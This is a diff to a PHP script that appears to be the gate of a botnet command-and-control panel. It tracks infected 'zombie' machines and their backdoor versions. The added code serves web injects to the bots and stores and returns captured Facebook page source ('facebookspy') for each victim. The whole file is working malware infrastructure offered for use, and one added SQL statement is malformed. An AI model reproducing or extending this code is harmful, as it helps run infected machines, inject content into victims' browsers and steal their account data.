@@ -1,5 +1,6 @@
 <?php
 require_once('includes/config.php');
+require('class/inject.class.php');
 if(isset($_GET['info']) && isset($_GET['url']) && $_GET['info'] != '' && $_GET['url'] != '' && isset($_GET['zname']) && $_GET['zname'] != '')
 {
     $info = $_GET['info'];
@@ -79,7 +80,7 @@ elseif(isset($_GET['add']) && $_GET['add'] != '' && isset($_GET['version']) && $
 {
     $zombie_name = $_GET['add'];
     $backdoor_name = $_GET['version'];
-    $check = $bdd->prepare("SELECT * FROM bots WHERE name = :name");
+    $check = $bdd->prepare("SELECT * FROM bots WHERE name =:name");
     $check->bindParam(':name', $zombie_name);
     $check->execute();
     $result = $check->fetch();
@@ -95,5 +96,43 @@ elseif(isset($_GET['online']) && $_GET['online'] != ''){
     $online = $bdd->prepare("UPDATE bots SET online = '1' WHERE name = :name");
     $online->bindParam(':name', $zombie);
     $online->execute();
+}
+elseif(isset($_GET['webinject']) && $_GET['webinject'] != '' && isset($_GET['zombie']) && $_GET['zombie'] != ''){
+    WebInject::show_inject($_GET['webinject']);
+}
+elseif(isset($_GET['source_spy']) && $_GET['source_spy'] != ''){
+    $select = $bdd->prepare("SELECT * FROM facebookspy WHERE bot_id = :id");
+    $select->bindParam(':id', $_GET['source_spy']);
+    $select->execute();
+    if($select->rowCount() > 0){
+        $fetch = $select->fetch();
+        if($fetch['source_code'] != ''){
+            echo base64_decode($fetch['source_code']);
+        }
+    }
+}
+elseif(isset($_POST['add_source_spy']) && $_POST['add_source_spy'] != '' && isset($_POST['z_name']) && $_POST['z_name'] != ''){
+    $select_id = $bdd->prepare("SELECT id FROM bots WHERE name = :name");
+    $select_id->bindParam(':name', $_POST['z_name']);
+    $select_id->execute();
+    if($select_id->rowCount() > 0){
+        $fetch = $select_id->fetch();
+        $ids = $fetch['id'];
+        $select = $bdd->prepare("SELECT * FROM facebookspy WHERE bot_id = :id");
+        $select->bindParam(':id', $ids);
+        $select->execute();
+        if($select->rowCount() > 0){
+            $update = $bdd->prepare("UPDATE facebookspy SET source_code  :source_code WHERE bot_id = :bot_id");
+            $update->bindParam(':source_code', $_POST['add_source_spy']);
+            $update->bindParam(':bot_id', $ids);
+            $update->execute();
+        }
+        else{
+            $insert = $bdd->prepare("INSERT INTO facebookspy(bot_id,source_code) VALUES(:bot_id, :source_code)");
+            $insert->bindParam(':bot_id', $ids);
+            $insert->bindParam(':source_code', $_POST['add_source_spy']);
+            $insert->execute();
+        }
+    }
 }
 ?>
